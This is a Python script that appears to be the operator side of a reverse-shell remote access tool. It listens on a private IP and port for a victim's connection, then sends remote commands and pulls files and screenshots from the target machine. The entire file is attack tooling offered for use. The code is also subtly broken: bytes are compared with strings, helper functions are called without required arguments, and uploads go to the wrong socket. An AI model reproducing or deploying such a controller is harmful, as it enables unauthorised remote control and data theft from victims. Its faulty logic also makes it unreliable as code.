import socket
import os
listener_ip = '192.168.0.108'
listener_port = 6996

def download(file_name):
    file = os.path.join(os.path.dirname(file_name))
    file_recv = open(file, 'wb')
    data_recv = target.recv(2048)
    file_recv.write(data_recv)
    file_recv.close()

def screenshot():
    num = 1
    sc = open('ScreenShot/Screenshot_%d'%num, 'wb')
    img = target.recv(2048)
    sc.write(img)
    sc.close()


def upload(file_name):
    file_upload = open(file_name, 'rb')
    data_to_send = file_upload.read()
    sock.send(data_to_send.encode())

def shell_command():
    while True:
        command = input("[-] RemoteCommand~#: ")
        command = command.encode()
        target.send(command)
        if command == 'q':
            target.close()
            break
        elif command[:2] == 'cd' and len(command) > 1:
            continue
        elif command[:5] == 'mkdir' and len(command) > 1:
            continue
        elif command[:8] == 'download' and len(command) > 1:
            try:
                download()
            except:
                continue

        elif command[:6] == 'upload' and len(command) > 1:
            try:
                upload()
            except:
                continue
        else:
            result = target.recv(2048)
            result = result.decode()
            print(result)

def listener():
    global sock
    global ip
    global target
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    sock.bind((listener_ip, listener_port))
    sock.listen()
    print("[+] Listening for target ...\n")
    target, ip = sock.accept()
    print("[+] Get connection from target. Starting shell command...\n")

if __name__ == "__main__":
    listener()
    shell_command()
    sock.close()